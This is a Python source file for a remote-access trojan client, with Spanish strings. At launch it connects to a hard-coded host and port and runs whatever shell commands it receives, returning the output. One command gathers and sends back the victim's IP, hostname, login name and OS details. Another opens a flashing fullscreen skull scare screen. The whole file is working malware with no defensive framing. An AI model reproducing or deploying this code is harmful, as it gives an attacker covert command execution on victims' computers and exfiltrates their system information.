import socket
import subprocess
import tkinter as tk
import sys
import os
import platform
import json
from urllib import request
from colorama import Fore, init
import keyboard

def initTk():
            # Ejecutar la interfaz gráfica de Tkinter
            txt12 = '''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡤⠤⠴⠶⠶⠒⠶⠶⠦⠤⢤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⢶⠟⠫⠅⠐⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢽⣛⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠟⢋⡵⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣈⠛⢷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⣠⡾⠋⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⢀⣾⠋⢀⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢦⡘⢻⣆⠀⠀⠀⠀⠀
                    ⠀⠀⠀⣠⡞⢁⡴⢃⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠙⣷⡀⠀⠀⠀
                    ⠀⠀⣰⠏⢰⠏⠀⠀⠃⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠀
                    ⠀⣸⠏⢠⣿⢠⣄⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠈⢿⡄⠀
                    ⢠⡏⢀⢿⣯⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠈⣷⠀
                    ⣾⠀⢼⣿⣿⡀⠹⣿⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⢸⡇
                    ⡿⠀⠀⢿⣿⣇⠀⢿⣾⡷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⣇
                    ⣇⠀⠀⠼⣿⣿⠀⠸⣯⣶⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿
                    ⣿⠀⠘⢿⣿⣿⣇⠀⢿⣿⠷⠖⠓⠲⠆⠀⠠⠾⢶⣄⠀⠀⠀⠀⠀⠀⣠⡴⠖⠙⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⣿⡁⠀⠀⠀⢠⡟
                    ⢻⡆⠀⢹⣿⣿⡿⠂⠀⠀⠀⠀⠀⣀⠀⢤⠀⠀⠀⠀⠁⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⡀⠀⠄⠀⠀⠀⠀⠘⣿⣺⠀⠀⠀⣼⠃
                    ⠘⣷⠀⠘⢿⣿⡄⠀⢀⣠⣤⣴⣾⣿⣿⣿⣷⣦⣤⣀⣀⣷⣤⣼⣧⠀⣀⣤⣤⣶⣾⣿⣷⣶⣦⣤⣄⡀⠀⠀⢻⡗⠀⠀⢀⡿⠀
                    ⠀⠸⣧⠀⠈⢿⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠈⡇⢈⡿⢦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⠃⠀⢀⣼⠃⠀
                    ⠀⠀⣿⣆⡴⢻⡄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡇⢸⡴⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⠢⡀⣼⡇⠀⠀
                    ⠀⠀⢸⡼⡇⣸⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣻⢃⡶⠀⣦⠳⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠆⡇⠀⣏⣿⠀⠀⠀
                    ⠀⠀⠘⣿⠁⠙⣷⡈⠻⣿⣿⣿⣿⣿⠿⠿⠛⠻⣀⣴⡇⣾⣿⣠⣿⡄⢳⣄⠈⠙⠻⢿⣿⣿⣿⣿⣿⠿⠃⣠⠇⠀⠸⣿⠂⠀⠀
                    ⠀⠀⣠⠏⠀⠀⠈⠿⡷⠲⠦⠾⠀⠀⠒⠒⠒⠚⢡⣾⢸⣿⣿⣿⣿⣿⢸⡟⠿⢶⣤⠴⠚⠒⠤⡒⠒⠒⠋⣁⡀⠀⠀⢹⣆⠀⠀
                    ⠀⠸⣿⠀⠀⠀⠜⢈⠇⠀⠀⠀⠀⠀⣀⣠⡴⠊⣿⡇⣿⣿⣿⣿⣿⣿⡇⢣⠀⠠⢄⣀⡀⠀⠀⠈⠳⢄⡀⠀⠉⠑⢦⠀⣿⠀⠀
                    ⠀⠀⠙⢿⣄⠀⠰⡃⠀⠀⠀⠀⠀⢺⡁⠀⠀⠀⠘⡇⣿⣿⣿⣿⣿⣿⡟⢘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⣠⡿⠃⠀⠀
                    ⠀⠀⠀⠀⠻⣷⣤⣿⣶⣶⣶⣶⢦⣄⡹⡄⠀⠀⠀⠳⡘⢿⣿⠗⣿⡿⢣⠏⠀⠀⠀⡠⢊⣤⣶⣶⣶⣾⣷⣤⣤⡴⠋⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⡏⠀⢿⡇⠀⠀⣸⠁⡄⠙⡶⣍⠀⣩⠖⠁⠀⠀⠀⠀⢁⣾⡟⠀⢿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠙⣿⠉⠛⢹⣷⠀⢸⡇⠀⠀⡇⠀⢇⢠⠀⠙⠀⠃⡠⠀⡀⠀⠀⠀⣀⣻⠃⢠⣿⠛⠉⣹⡟⠁⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⢸⡀⠐⡄⢿⣧⣸⠿⣾⣶⣾⢤⣬⣦⣤⣤⣀⣤⣧⣤⣯⠦⣶⣴⣿⢻⢀⣿⠏⡰⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢷⠘⣿⣿⣶⣿⣼⡇⢸⡇⠈⠁⠀⢏⠀⢸⠀⢸⠀⣧⣯⣼⡞⢹⡟⣰⠃⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⢸⢣⠀⠈⢇⠘⣿⠷⣽⠸⡟⡾⢧⡴⣄⣀⣯⣀⡼⣤⠾⡟⢻⢸⣽⢆⡾⢀⠟⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⣾⡴⠀⠀⠈⠆⠈⠆⠺⢟⠣⢧⣀⣇⣣⠀⣇⢈⣇⣎⣀⣧⢛⡿⠀⠜⢡⠋⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⡀⠀⠀⠀⠀⠀⠈⠑⠶⣭⣉⠙⠋⠏⠹⣉⣉⡽⠞⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⣀⠀⠀⢀⠀⠀⠀⠀⠀⠉⠻⠿⠛⠉⠁⠀⠀⠀⡀⠀⠀⣷⣠⣤⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠳⣦⡀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠚⠁⢀⣴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠉⠁⠀⠀⠒⠒⠈⠗⠃⢀⣠⡶⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠶⠶⠶⠶⠶⠶⠶⣶⡶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⡀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''
            class App:
                def __init__(self, master):
                    self.master = master
                    self.master.configure(bg="red")
                    self.master.attributes('-fullscreen', True)
                    self.label = tk.Label(self.master, text=txt12, font=("Arial", 10), bg="red", fg="white")
                    self.label.pack(expand=True)
                    self.color = "red"
                    self.timer_running = True
                    self.update_color()
        
                def update_color(self):
                    if  self.color == "red":
                        self.master.configure(bg="red")
                        self.label.configure(bg="red", fg="white")
                        self.color = "white"
                    else:
                        self.master.configure(bg="white")
                        self.label.configure(bg="white", fg="red")
                        self.color = "red"
                    if self.timer_running:
                        self.master.after(100, self.update_color)

                def stop_timer(self, text):
                    self.timer_running = False
                    self.label.configure(text=text, font=("Arial", 13), fg="white")
                    self.master.configure(bg="red")
                    self.label.place(x=0, y=50)
 
            root = tk.Tk()
            app = App(root)
            root.after(4000, app.stop_timer)
            root.mainloop()

def info():
    init(autoreset=True)
    correct3 = (Fore.GREEN + "   Dirección   ")

    url = request.urlopen('https://ipinfo.io/json').read()
    jsn = json.loads(url.decode('UTF-8'))
    ip = jsn['ip']
    hostname2 = jsn['ip']
    hostname = socket.gethostname()

    ip = socket.gethostbyname(hostname)
    sistema = platform.system()

    data = []
    data.append("IP:" + ip)
    data.append(correct3)
    data.append("El sistema operativo es: {}".format(sistema))
    data.append("El nombre de tu ordenador es: " + hostname)
    data.append("Has iniciado sesión con: " + os.getlogin())
    data.append("Tu dirección IP es: " + ip)
    data.append("Nombre del usuario: " + os.getlogin())
    data.append("Arquitectura del sistema: " + platform.machine())
    data.append("Versión del sistema operativo: " + platform.version())
    data.append("Release del sistema operativo: " + platform.release())
    data.append("Tipo de máquina: " + platform.processor())

    return data
def blockKey():
    key=('win')
    keyboard.read_event(key)

def client():
    host = '192.168.1.38' 
    port = 1234  
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        command_received = client_socket.recv(1024).decode()
        print(command_received)
        
        if command_received == '!tk':
            initTk()
        elif command_received == '!ana':
            informacion_sistema = info()
            for i in informacion_sistema:
                client_socket.send(str.encode(f'{i}\n'))
        else:
            try:
                result = subprocess.run(command_received, capture_output=True, text=True)
                exit_code = result.stdout
                client_socket.send(str.encode(exit_code))
            except Exception as e:
                client_socket.send(str.encode(f'Error al ejecutar el comando: {str(e)}'))

    client_socket.close()


client()

